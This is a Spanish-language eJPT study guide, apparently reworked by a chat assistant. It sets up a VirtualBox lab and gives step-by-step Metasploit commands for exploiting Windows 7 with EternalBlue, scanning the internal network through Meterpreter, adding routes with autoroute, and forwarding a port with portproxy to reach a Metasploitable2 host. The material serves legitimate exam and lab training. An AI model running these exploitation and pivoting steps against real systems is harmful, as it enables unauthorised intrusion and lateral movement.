
----
- TAG: #Pivoting #Sistemas #Windows 
----
Lo siento por eso, voy a mantener los comentarios y detalles intactos en esta revisión. Aquí tienes tus notas mejoradas:

---

## Pivoting en eJPT: Configuración con Máquina Windows

En este apartado aprenderemos cómo realizar el pivoting para el examen eJPT, comenzando con una máquina Windows para luego encontrar y pivotear a una máquina **Linux**.

### Preparativos

1. **Máquina Vulnerable:** [Windows7](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing)
2. **Máquina Atacante:** **Kali Linux**
3. **Máquina Objetivo Secundaria:** [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2)

### Configuración del Entorno de Red en VirtualBox

1. Ir a **Archivo > Herramientas > Administrador de red**.
2. En el apartado de **Redes NAT**, hacer clic en **Crear**.
3. Asignar un nombre a la red, por ejemplo, **Red_Pivoting**.
4. En **Prefijo IPv4**, asignar la IP `10.10.10.0/24`.
5. Hacer clic en **Aplicar**.

### Configuración de la Máquina **Windows7**

1. En la configuración de la máquina, ir a **Red**.
2. Seleccionar **Adaptador2**.
3. Habilitar **Adaptador de red** y seleccionar **Red NAT**.

> **Nota:** Ahora la máquina Windows7 debería tener dos interfaces de red: una para el adaptador puente y otra para la red NAT.

### Configuración de la Máquina **Metasploitable2**

1. En la configuración de la máquina, ir a **Red**.
2. Asegurarse de que solo tiene una interfaz de red conectada a la **Red_NAT**.

### Configuración de la Máquina **Kali Linux**

1. Configurar **Kali Linux** con un adaptador puente.

---

### Arranque y Verificación de las Máquinas

1. Arrancar las máquinas en el siguiente orden:
   1. **Kali Linux**
   2. **Windows7**
   3. **Metasploitable2**

2. Realizar comprobaciones de red:
   - En **Windows7**, ejecutar `ipconfig` para verificar las dos interfaces de red.
   - En **Kali Linux**, ejecutar `ifconfig` para confirmar que solo hay una interfaz de red.
   - Iniciar sesión en **Metasploitable2** con:
     - **Usuario:** `msfadmin`
     - **Contraseña:** `msfadmin`
     - Ejecutar `ifconfig` para verificar que tiene una sola interfaz de red.

---

### Infiltración en la Máquina Windows7 y Pivoting

1. **Escaneo de Interfaces de Red con ARP-SCAN:**

```bash
arp-scan -I eth0 --localnet
```

   - Localizar la máquina **Windows** en la red.

2. **Explotación de la Vulnerabilidad EternalBlue:**

   - Ejecutar **msfconsole** y buscar el exploit:

```bash
search eternalblue
```

   - Usar el exploit número 0:

```bash
use 0
```

   - Configurar el exploit:

```bash
show options
```

   - Asignar la dirección IP de la máquina **Windows** vulnerable:

```bash
set RHOSTS 1.2.3.4
```

   - Ejecutar el exploit:

```bash
run
```

   - Una vez dentro de la máquina **Windows**, verificar si tiene más interfaces de red para pivotear:

```bash
ipconfig
```

> **Nota:** Si aparece una dirección IP en la **interface 13** correspondiente a la red NAT, esta es la máquina para hacer pivoting. Si solo aparece una dirección, es posible que no sea la máquina adecuada para pivoting.

3. **Poniendo en Segundo Plano la Sesión de Meterpreter:**

   - Para hacer pivoting, es necesario poner la sesión de **Meterpreter** en segundo plano:

```bash
Ctrl + Z
```

   - Verificar las sesiones en segundo plano:

```bash
sessions -l
```

4. **Escaneo de la Red Interna:**

   - Usar el módulo de **Metasploit** para escanear equipos en la red interna:

```bash
use windows/gather/arp_scanner
```

   - Ver las configuraciones del módulo:

```bash
show options
```

   - Configurar la sesión y el rango de IP a escanear:

```bash
set SESSION 1
set RHOSTS 10.10.10.0/24
```

   - Ejecutar el escaneo:

```bash
run
```

 > **Nota:** Identificar las IPs de la red, excluyendo las puertas de enlace (.1 y .2) que comparten la misma **MAC**. Buscar la IP de **Metasploit2** (ej. `10.10.10.5`).

5. **Enrutando el Tráfico con Autoroute:**

   - Usar el módulo **Autoroute** para enrutar el tráfico de la máquina **Metasploit2** hacia **Kali Linux**:

```bash
use multi/manage/autoroute
```

   - Configurar la sesión del **Meterpreter**:

```bash
set SESSION 1
```

   - Ejecutar el módulo:

```bash
run
```

6. **Escaneo de Puertos en la Máquina Victima:**

   - Usar el módulo de escaneo de puertos **TCP**:

```bash
use scanner/portscan/tcp
```

   - Configurar la dirección IP de la máquina **Metasploit2**:

```bash
set RHOSTS 10.10.10.5
```

   - Ejecutar el escaneo:

```bash
run
```

> **Nota:** En el examen, es recomendable esperar a que el escaneo termine completamente para identificar todos los puertos abiertos. Enfocarse en el puerto `80` para la enumeración, ya que suele ser un puerto clave para explotar.

7. **Pivoting con Portproxy en Windows:**

   - Usar el módulo **Portproxy** para pivoting:

```bash
use post/windows/manage/portproxy
```

   - Configurar los parámetros:

```bash
set CONNECT_ADDRESS 1.2.3.5 # ip de la máquina victima 
set CONNECT_PORT 80 # El puerto por donde queremos acceder
set LOCAL_ADDRESS 0.0.0.0 # Siempre va 0.0.0.0
set LOCAL_PORT 5000 # El puerto por donde nos queremos traer el puerto objetivo 
set SESSION 1 # Sesión id del meterpreter de la máquina Widnows
```

   - Ejecutar el módulo:

```bash
run
```

   - Verificar si el pivoting fue exitoso accediendo desde el navegador:

```https
10.10.10.4:5000
```

 > **Nota:** Si todo salió bien, deberías ver el inicio de la página web mostrando el servidor de **Metasploit2**.

---

Esto concluye la guía sobre pivoting en una máquina Windows. ¡Buena suerte en el examen eJPT!

---

